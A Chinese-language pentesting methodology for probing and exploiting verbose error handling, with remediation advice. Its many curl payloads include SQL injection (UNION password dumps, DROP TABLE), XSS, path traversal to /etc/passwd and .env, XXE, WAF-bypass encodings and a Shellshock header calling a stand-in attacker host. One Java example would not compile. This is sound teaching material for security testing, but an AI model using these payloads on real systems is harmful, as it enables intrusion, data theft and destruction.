# 错误处理测试攻击方法论

---

## 第一部分：文档概述

### 1.1 编写目的
为渗透测试人员提供针对应用程序错误处理的检测与利用方法论。不当的错误处理会导致敏感信息泄露、系统架构暴露，甚至帮助攻击者完成攻击链。

### 1.2 适用范围
- Web 应用程序错误处理
- API 错误响应
- 数据库错误信息
- 框架级错误处理
- 微服务错误传播

### 1.3 读者对象
- 渗透测试工程师
- 应用安全测试人员
- 代码审计人员

---

## 第二部分：核心渗透技术专题

### 专题：错误处理测试攻击

#### 2.1 技术介绍

错误处理（Error Handling）是应用程序处理异常情况的功能。当错误处理配置不当时，服务器会向用户返回详细的错误信息，包括堆栈跟踪、数据库错误、路径信息等，这些信息可被攻击者用于进一步攻击。

**错误处理问题的本质风险：**

| 风险类型 | 描述 | 危害等级 |
|---------|------|---------|
| **信息泄露** | 暴露内部实现、版本、路径 | 高 |
| **攻击辅助** | 帮助 SQL 注入、XSS 等攻击 | 高 |
| **系统映射** | 暴露技术栈和架构 | 中 |
| **DoS 攻击** | 触发未处理异常导致崩溃 | 中 |

**CWE 映射：**

| CWE 编号 | 描述 |
|---------|------|
| CWE-728 | 不当错误处理 |
| CWE-209 | 错误处理中的信息泄露 |
| CWE-215 | 调试信息泄露 |

#### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **输入验证** | 表单提交、API 参数 | 触发验证错误暴露逻辑 |
| **数据库操作** | 查询、更新、删除 | SQL 错误暴露查询结构 |
| **文件操作** | 上传、下载、读取 | 路径错误暴露文件系统 |
| **认证授权** | 登录、权限检查 | 认证错误暴露用户信息 |
| **第三方集成** | API 调用、服务通信 | 远程错误暴露架构 |
| **微服务架构** | 服务间通信 | 错误链暴露服务依赖 |

#### 2.3 漏洞探测方法

##### 2.3.1 黑盒测试

**1. Web 服务器错误测试**

```bash
# 触发 404 错误
curl http://target/nonexistent-file-12345.php -i
curl http://target/random-folder-abc123/ -i

# 测试目录访问行为
curl http://target/admin/ -i
curl http://target/backup/ -i
curl http://target/config/ -i

# 发送超长路径（触发缓冲区错误）
curl "http://target/$(python3 -c 'print("A"*5000)')" -i

# 破坏 HTTP 请求格式
curl -H "Invalid-Header:::BadFormat" http://target/ -i

# 修改 HTTP 版本
curl --http0.9 http://target/ -i
```

**2. 应用程序错误测试**

```bash
# 字符串输入测试
curl "http://target/search?q=' OR '1'='1" -i
curl "http://target/user?name=<script>alert(1)</script>" -i
curl "http://target/file?path=../../etc/passwd" -i

# 整数输入测试
curl "http://target/user?id=-1" -i
curl "http://target/user?id=0" -i
curl "http://target/user?id=99999999999999999999" -i
curl "http://target/user?id=0x7FFFFFFF" -i

# JSON 解析测试
curl -X POST http://target/api/user \
  -H "Content-Type: application/json" \
  -d '{"key": "value"' -i

curl -X POST http://target/api/user \
  -H "Content-Type: application/json" \
  -d '{"key": undefined}' -i

# XML 解析测试
curl -X POST http://target/api/xml \
  -H "Content-Type: application/xml" \
  -d '<root><unclosed>' -i

# 空字节测试
curl "http://target/file?name=test%00.txt" -i
```

**3. 请求头错误测试**

```bash
# X-Forwarded-For 注入
curl -H "X-Forwarded-For: 127.0.0.1\r\nX-Injected: header" http://target/ -i

# User-Agent 注入
curl -H "User-Agent: () { :; }; /bin/bash -c 'curl attacker.com'" http://target/ -i

# Referer 注入
curl -H "Referer: javascript:alert(1)" http://target/ -i

# 超大 Cookie
curl -H "Cookie: session=$(python3 -c 'print("A"*5000)')" http://target/ -i
```

##### 2.3.2 白盒测试

**1. 代码审计要点**

```python
# ❌ 不安全：直接返回异常信息
try:
    result = db.query(user_input)
except Exception as e:
    return str(e)  # 泄露 SQL 错误

# ✅ 安全：返回通用错误
try:
    result = db.query(user_input)
except Exception as e:
    logger.error(str(e))
    return "操作失败，请稍后重试"
```

```java
// ❌ 不安全：堆栈跟踪暴露
catch (SQLException e) {
    response.getWriter().write(e.printStackTrace());
}

// ✅ 安全：记录日志，返回通用消息
catch (SQLException e) {
    logger.error("Database error", e);
    response.getWriter().write("操作失败");
}
```

**2. 配置文件检查**

```python
# Django settings.py
DEBUG = True  # ❌ 不安全 - 显示详细错误
DEBUG = False  # ✅ 安全

# Flask
app.debug = True  # ❌ 不安全

# PHP php.ini
display_errors = On  # ❌ 不安全
display_errors = Off  # ✅ 安全
log_errors = On  # ✅ 记录到日志
```

#### 2.4 漏洞利用方法

##### 2.4.1 敏感错误信息识别

**高危错误类型：**

| 错误类型 | 示例 | 风险等级 | 利用价值 |
|---------|------|---------|---------|
| **堆栈跟踪** | `at com.app.Service.method(Service.java:42)` | 🔴 高 | 代码逻辑、类名、方法名 |
| **SQL 错误** | `ORA-00933: SQL command not properly ended` | 🔴 高 | 数据库类型、查询结构 |
| **路径泄露** | `FileNotFoundError: /var/www/app/config.py` | 🟠 中 | 文件系统结构 |
| **版本信息** | `Python 3.9.7 / Django 3.2.5` | 🟠 中 | 已知漏洞利用 |
| **连接字符串** | `mysql://user:pass@localhost:3306/db` | 🔴 严重 | 直接数据库访问 |
| **内存转储** | `Memory dump at 0x7fff5fbff8c0` | 🔴 高 | 内存敏感数据 |

**数据库错误特征：**

```
# MySQL
You have an error in your SQL syntax; check the manual that 
corresponds to your MySQL server version

# PostgreSQL
ERROR:  syntax error at or near "SELECT"
LINE 1: SELECT * FROM users WHERE id='

# SQL Server
Unclosed quotation mark after the character string ''

# Oracle
ORA-00933: SQL command not properly ended
ORA-01756: quoted string not properly terminated

# MongoDB
MongoServerError: unknown operator: $orrr
```

##### 2.4.2 堆栈跟踪利用

**1. 技术栈识别**

```
从堆栈跟踪中提取：
- 编程语言和版本
- 框架名称和版本
- 使用的库和版本
- 服务器类型和版本

示例：
Exception in thread "main" java.lang.NullPointerException
    at com.example.app.UserService.getUser(UserService.java:45)
    at com.example.app.Controller.handleRequest(Controller.java:123)
    at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:897)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:750)

提取信息：
- Java 应用
- Spring Framework
- 运行在 Servlet 容器
- 包结构：com.example.app
```

**2. 代码逻辑分析**

```
从堆栈跟踪中分析：
1. 调用链：了解请求处理流程
2. 类名和方法名：推断功能实现
3. 文件路径：定位源码位置
4. 行号：精确定位问题代码
```

##### 2.4.3 SQL 错误注入辅助

```bash
# 1. 触发 SQL 错误
curl "http://target/user?id=1'" -i

# 响应包含：
# You have an error in your SQL syntax; ... near ''1'' at line 1

# 2. 分析查询结构
# 推断：SELECT * FROM users WHERE id='$input'

# 3. 构造注入 Payload
curl "http://target/user?id=1' OR '1'='1" -i
curl "http://target/user?id=1' UNION SELECT password FROM users--" -i

# 4. 基于错误的注入
curl "http://target/user?id=1 AND 1=1" -i  # 正常
curl "http://target/user?id=1 AND 1=2" -i  # 异常
```

##### 2.4.4 路径信息利用

```bash
# 1. 从错误中提取路径
curl "http://target/file?name=../../etc/passwd" -i
# 响应：FileNotFoundError: /var/www/app/files/../../etc/passwd

# 2. 确定 Web 根目录
# /var/www/app/files/ 是基础路径

# 3. 构造精确的路径遍历
curl "http://target/file?name=../../../etc/passwd" -i
curl "http://target/file?name=../../../var/www/app/config.php" -i

# 4. 读取敏感文件
curl "http://target/file?name=../../../var/www/app/.env" -i
```

##### 2.4.5 微服务错误链分析

```
┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│   Gateway   │ -> │   Service A │ -> │  Database   │
└─────────────┘    └─────────────┘    └─────────────┘
        |                  |
        v                  v
   错误信息 1          错误信息 2
   (Gateway)          (Service)

分析步骤：
1. 识别错误来源服务
2. 映射服务依赖关系
3. 针对不同服务定制攻击
4. 利用错误链扩大攻击面
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 隐蔽错误检测

错误可能以非标准方式返回：

```bash
# 200 OK 但包含错误体
curl "http://target/api/data?id=invalid" -i
# HTTP/1.1 200 OK
# {"error": "Internal server error", "stack": "...", "debug": true}

# 302 重定向隐藏错误
curl "http://target/action?param=invalid" -i
# HTTP/1.1 302 Found
# Location: /error?message=NullPointerException

# 自定义错误格式
curl "http://target/api/process" -i
# {"status": "fail", "code": 500, "debug_info": {...}}
```

##### 2.5.2 WAF 绕过

```bash
# URL 编码绕过
curl "http://target/user?id=1%27" -i

# 双重编码
curl "http://target/user?id=1%2527" -i

# Unicode 编码
curl "http://target/user?id=1\u0027" -i

# 分块传输绕过
curl -X POST http://target/api \
  -H "Transfer-Encoding: chunked" \
  -d "1\r\n'\r\n0\r\n\r\n" -i
```

##### 2.5.3 日志注入绕过

```bash
# 注入换行符伪造日志
curl "http://target/log?msg=test%0D%0A127.0.0.1%20-%20[admin]" -i

# 注入 HTML 污染日志查看器
curl "http://target/search?q=<script>alert(1)</script>" -i
```

---

## 第三部分：附录

### 3.1 错误信息测试检查清单

```
□ 测试 404 错误页面
□ 测试 500 错误响应
□ 测试目录访问错误
□ 测试输入验证错误
□ 测试数据库错误
□ 测试文件操作错误
□ 测试认证授权错误
□ 测试 API 解析错误
□ 测试请求头注入
□ 测试超大载荷错误
□ 检查堆栈跟踪泄露
□ 检查版本信息泄露
□ 检查路径信息泄露
□ 检查连接字符串泄露
```

### 3.2 自动化测试工具

| 工具名称 | 用途 | 命令示例 |
|---------|------|---------|
| **Burp Suite** | 手动/自动 Fuzzing | Intruder 模块 |
| **OWASP ZAP** | 主动扫描 | 内置错误处理扫描 |
| **ffuf** | 快速 Fuzzing | `ffuf -w payload.txt -u http://target/FUZZ` |
| **sqlmap** | SQL 错误注入 | `sqlmap -u "http://target?id=1" --batch` |
| **自定义脚本** | 针对性测试 | Python/Go 脚本 |

### 3.3 Payload 速查表

| 类别 | Payload | 目标 |
|-----|--------|------|
| **SQL 注入** | `' OR '1'='1` | 触发 SQL 错误 |
| **SQL 注入** | `'; DROP TABLE users--` | 测试危险查询 |
| **XSS** | `<script>alert(1)</script>` | 触发脚本错误 |
| **路径遍历** | `../../etc/passwd` | 触发文件错误 |
| **命令注入** | `; id` | 触发命令错误 |
| **XXE** | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` | 触发 XML 错误 |
| **反序列化** | `\xac\xed\x00\x05...` | 触发解析错误 |
| **整数溢出** | `99999999999999999999` | 触发数值错误 |
| **空字节** | `test%00.txt` | 触发截断错误 |

### 3.4 修复建议

- [ ] **实施全局异常处理** - 使用统一的错误处理中间件
- [ ] **返回通用错误消息** - 不向用户暴露详细错误
- [ ] **记录详细错误到日志** - 仅供内部调试使用
- [ ] **关闭生产环境调试模式** - DEBUG=False
- [ ] **统一错误响应格式** - 标准化 API 错误响应
- [ ] **实施错误监控** - 使用 Sentry 等工具监控错误
- [ ] **定期代码审计** - 检查错误处理逻辑

---

**参考资源：**
- [OWASP WSTG-ERRH-01: Testing For Improper Error Handling](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Error Handling Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html)
- [ASVS v4.1 V7.4 - Error Handling](https://owasp.org/www-project-application-security-verification-standard/)
- [CWE-728: Improper Error Handling](https://cwe.mitre.org/data/definitions/728.html)
